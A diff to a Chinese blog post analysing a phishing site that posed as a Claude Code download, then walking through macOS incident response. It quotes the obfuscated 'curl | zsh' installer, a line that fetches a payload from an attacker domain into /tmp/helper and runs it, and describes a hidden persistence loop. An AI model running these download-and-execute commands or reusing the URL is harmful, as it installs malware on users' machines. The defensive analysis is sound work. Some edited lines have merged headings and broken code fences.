@@ -1,6 +1,6 @@
 ---
-title:'被钓鱼网站攻击的实录分析'
-date: '2026-4-10'
+title: '被钓鱼网站攻击的实录分析'
+date: '2026-04-10'
 tags: ['web security']
 draft: false
 summary: '今天朋友突然找我说下载claude code的时候被病毒入侵了，我想这也可以做一个分析来讲解一下整个工具链，以及我们误入钓鱼软件后应该怎么应急响应'
@@ -11,10 +11,21 @@ summary: '今天朋友突然找我说下载claude code的时候被病毒入侵�
 <img src="/static/images/Web security/fake.png" alt="钓鱼网站" width="700" />
 <img src="/static/images/Web security/attack1.png" alt="被攻击记录" width="350" />
 <img src="/static/images/Web security/attack2.png" alt="被攻击记录" width="350" />
-于是我决定做一期针对这个入侵链的分析 # 网站原始下载命令 首先网站利用用户对于curl | shell
-安装方式的信任，给了一个指向攻击域名的下载链接 ```zsh curl -SsLfk $(echo '...'|tr '...' '...')| zsh
-``` ## 拆分一下框架 - $(echo '加密字符串' | tr '旧字符表' '新字符表') - curl -SsLfk
-[上面算出来的结果] - zsh
+于是我决定做一期针对这个入侵链的分析。
+
+## 网站原始下载命令
+
+这个网站利用用户对于 `curl | shell` 安装方式的信任，给了一个指向攻击域名的下载链接：
+
+```zsh
+curl -SsLfk $(echo '...' | tr '...' '...') | zsh
+```
+
+## 拆分一下框架
+
+- `$(echo '加密字符串' | tr '旧字符表' '新字符表')`
+- `curl -SsLfk [上面算出来的结果]`
+- `zsh`
 
 整体意思就是：
 **先把一段伪装字符串还原成真正的 URL，再用 curl 去下载这个 URL 的内容，然后把下载到的内容直接交给 zsh 执行**
@@ -174,9 +185,9 @@ PAYLOAD_END
 
 这一段的意思是：**先把后面那串看不懂的内容(我省略写成...)解码、解压，再把结果存进变量 vyhhuo**
 
-这里又要继续拆:
+这里又要继续拆。
 
-#### <<'PAYLOAD_END' ... PAYLOAD_END
+#### heredoc：`<<'PAYLOAD_END' ... PAYLOAD_END`
 
 这是 **here-document**，也就是“把中间这一大段文本直接喂给前面的命令”。
 
@@ -184,7 +195,12 @@ PAYLOAD_END
 
 基本语法如下：
 
-> command << DELIMITER文本内容更多文本内容DELIMITER
+```zsh
+command << DELIMITER
+文本内容
+更多文本内容
+DELIMITER
+```
 
 所以这里送进去的数据就是这串：
 
@@ -255,11 +271,30 @@ eval "$a"
 # 脚本解析
 
 <img src="/static/images/Web security/persisdent_hidden.png" alt="攻击链流程" width="700" />
-## #!/bin/zsh 说明是zsh脚本，我们不再复述 ## curl -o /tmp/helper https:xxx ```curl -o /tmp/helper
-https://isgilan.com/n8n/update``` curl我们上面说过了，这段脚本其实就是说用 curl
-去访问这个网址，把服务器返回的内容保存到本地文件，文件名叫 /tmp/helper ```-o /tmp/helper``` = 输出到
-/tmp/helper ## && 前一条命令成功了，才继续执行下一条。 所以整条链是按下面这个顺序进行的 - 下载成功 -
-才去清属性 - 清属性成功 - 才去改权限 - 改权限成功 - 才去运行
+`#!/bin/zsh` 只是说明这是 zsh 脚本，我们不再复述。
+
+## curl -o /tmp/helper https://isgilan.com/n8n/update
+
+```zsh
+curl -o /tmp/helper https://isgilan.com/n8n/update
+```
+
+curl 我们上面说过了，这段脚本其实就是说用 `curl` 去访问这个网址，把服务器返回的内容保存到本地文件，文件名叫 `/tmp/helper`。
+
+`-o /tmp/helper` 的意思就是输出到 `/tmp/helper`。
+
+## &&
+
+前一条命令成功了，才继续执行下一条。
+
+所以整条链是按下面这个顺序进行的：
+
+- 下载成功
+- 才去清属性
+- 清属性成功
+- 才去改权限
+- 改权限成功
+- 才去运行
 
 ## xattr -c /tmp/helper
 
@@ -288,21 +323,25 @@ xattr 是查看或修改**扩展属性**的工具
 ## 先防止它继续活动
 第一步一定是断网，不再在这台机器上登录重要账号，不输入任何系统密码到可疑弹窗，不双击可疑文件
 ## 定性
-首先要确定```/tmp/helper``` 到底只是个文本脚本，还是已经是能直接运行的本地程序？
+首先要确定 `/tmp/helper` 到底只是个文本脚本，还是已经是能直接运行的本地程序。
 执行命令如下
 ```zsh
 shasum -a 256 /tmp/helper 2>/dev/null
 file /tmp/helper 2>/dev/null
 codesign -dv --verbose=4 /tmp/helper 2>&1 | sed -n '1,40p'
 ```
-```shasum -a 256 /tmp/helper```计算 ```/tmp/helper```的 SHA-256 哈希
-```
+
+`shasum -a 256 /tmp/helper` 计算 `/tmp/helper` 的 SHA-256 哈希。
+
 为什么算哈希？
-因为哈希像“文件指纹”：方便后续做 IOC,方便跟别人比对是不是同一个样本,以后做举报、写报告、查样本库都要用
-```
-```file /tmp/helper```让系统判断这个文件是什么类型
-这是应急里很常用的一步，因为```.sh```不一定真是脚本,没后缀的文件也可能是本地二进制,恶意样本经常故意伪装名字
-```codesign -dv --verbose=4 /tmp/helper```查看这个可执行文件的签名信息、标识信息、团队信息,判断它看起来像不像正常软件分发链
+
+因为哈希像“文件指纹”：方便后续做 IOC，方便跟别人比对是不是同一个样本，以后做举报、写报告、查样本库都要用。
+
+`file /tmp/helper` 让系统判断这个文件是什么类型。
+
+这是应急里很常用的一步，因为 `.sh` 不一定真是脚本，没后缀的文件也可能是本地二进制，恶意样本经常故意伪装名字。
+
+`codesign -dv --verbose=4 /tmp/helper` 查看这个可执行文件的签名信息、标识信息、团队信息，判断它看起来像不像正常软件分发链。
 
 ### 返回结果
 
@@ -329,8 +368,11 @@ TeamIdentifier=not set
 
 ### 返回结果
 
-`root 28494 ... osascript`另外还看到了` ... /Users/wagetl/Library/Application Support/.com.apple.accountsd/AccountsHelper
-root ... sudo -u  ...`
+```text
+root 28494 ... osascript
+... /Users/wagetl/Library/Application Support/.com.apple.accountsd/AccountsHelper
+root ... sudo -u ...
+```
 
 `root osascript` 很不正常osascript 本身是系统组件，正常。但一个以 root 身份运行很久的 osascript,在当前情况下，很可疑，它不是执行完就退出，而是在当前系统会话里继续活动
 
@@ -412,32 +454,29 @@ AccountsHelper 在做“常驻式运行”，因为它有 .lock 文件，这很�
 `sudo kill -9 28494 28496 28497`
 本以为执行这个命令就ok了，但是再查发现新的 PID 又冒出来了
 
-<img
-  src="/static/images/Web security/again.png"
-  alt="攻击链流程"
-  width="700"
-/>
-这一步说明杀掉的是“当前这一轮”，不是“重生它们的源头”。
-所以又去读.service
-## 读.service
-```cat /Users/wagetl/Library/Application\ Support/.com.apple.accountsd/.service```
-<img
-  src="/static/images/Web security/while.png"
-  alt="while死循环"
-  width="700"
-/>
-这段代码意思是while true每次跑一次 osascript查当前登录用户，如果不是 root，就 sudo -u 当前用户 运行 AccountsHelper，sleep 1，再来一次
-这也就是说明，真正的常驻器不是 LaunchAgent，也不是 AccountsHelper，而是这个 .service 死循环脚本
-## 先杀父进程
->既然 .service 是真正常驻器，那怎么把这条链真正停下来？
+<img src="/static/images/Web security/again.png" alt="攻击链流程" width="700" />
+这一步说明杀掉的是“当前这一轮”，不是“重生它们的源头”。 所以又去读.service ## 读.service
+
+```zsh
+cat /Users/wagetl/Library/Application\ Support/.com.apple.accountsd/.service
+```
+
+<img src="/static/images/Web security/while.png" alt="while死循环" width="700" />
+这段代码意思是while true每次跑一次 osascript查当前登录用户，如果不是 root，就 sudo -u 当前用户 运行
+AccountsHelper，sleep 1，再来一次 这也就是说明，真正的常驻器不是 LaunchAgent，也不是
+AccountsHelper，而是这个 .service 死循环脚本 ## 先杀父进程
+
+既然 `.service` 是真正常驻器，那怎么把这条链真正停下来？
+
 ```cmd
 ps aux | egrep -i '/Users/wagetl/Library/Application Support/.com.apple.accountsd/.service|AccountsHelper|osascript' | grep -v grep
-```
-```cmd
 ps -p 72183,72186 -o pid,ppid,user,start,time,command
 ```
-```ps aux | egrep ...```在全体进程里，筛和这条恶意链相关的关键字
+
+`ps aux | egrep ...` 是在全体进程里，筛和这条恶意链相关的关键字。
+
 ### 返回结果
+
 ```cmd
 目录里只有 .service.disabled
 但是进程里还活着：
@@ -446,15 +485,21 @@ ps -p 72183,72186 -o pid,ppid,user,start,time,command
 72561 sudo -u wagetl ...
 72562 AccountsHelper
 ```
+
 但其实在这步之前我还执行了另外两个指令，如下
+
 ```cmd
 chmod -x "/Users/wagetl/Library/Application Support/.com.apple.accountsd/.service"
 mv "/Users/wagetl/Library/Application Support/.com.apple.accountsd/.service" "/Users/wagetl/Library/Application Support/.com.apple.accountsd/.service.disabled"
 ```
+
 也就是降权和改名，但都无济于事，虽然改名是成功的，但这还不够，因为当时活着的父 bash 还是旧的那一份，它已经在内存里跑起来了。
+
 ## 删整个目录
->既然这是一个“工作目录”，那是不是应该整套清掉，而不是只删主程序？
+
+既然这是一个“工作目录”，那是不是应该整套清掉，而不是只删主程序？
 因为前面已经看到，这个隐藏目录里不止一个东西：
+
 ```
 .auth
 .cfg
@@ -462,8 +507,10 @@ mv "/Users/wagetl/Library/Application Support/.com.apple.accountsd/.service" "/U
 .service
 AccountsHelper
 ```
+
 这说明它不是单文件样本，而是一个小型运行环境。
 所以我们一条条删
+
 ```cmd
 rm -f "/Users/wagetl/Library/Application Support/.com.apple.accountsd/AccountsHelper"
 rm -f "/Users/wagetl/Library/Application Support/.com.apple.accountsd/.auth"
@@ -472,25 +519,20 @@ rm -f "/Users/wagetl/Library/Application Support/.com.apple.accountsd/.session"
 rm -f "/Users/wagetl/Library/Application Support/.com.apple.accountsd/.service.disabled"
 rmdir "/Users/wagetl/Library/Application Support/.com.apple.accountsd"
 ```
+
 到目前为止已经基本结束，只需重启后再用下面的命令复核一下即可
+
 ```
 ps aux | egrep -i 'Application Support/.com\.apple\.accountsd|AccountsHelper|osascript' | grep -v grep
 find ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null | egrep -i 'accountsd|helper|osascript'
 launchctl print gui/$(id -u) 2>/dev/null | egrep -i 'AccountsHelper|Application Support/.com.apple.accountsd|osascript'
 ```
+
 # 总结
-<img
-  src="/static/images/Web security/find.png"
-  alt="攻击链流程"
-  width="700"
-/>
-所以今天的内容其实是想告诉所有跟我朋友一样的uu，如果看到脚本里同时出现这些组合，要立刻警惕：
-```
-base64 -D
-gunzip
-eval
-$(...)
-```
+
+<img src="/static/images/Web security/find.png" alt="攻击链流程" width="700" />
+所以今天的内容其实是想告诉所有跟我朋友一样的uu，如果看到脚本里同时出现这些组合，要立刻警惕： ```
+base64 -D gunzip eval $(...) ```
 
 尤其是这种模式：
 
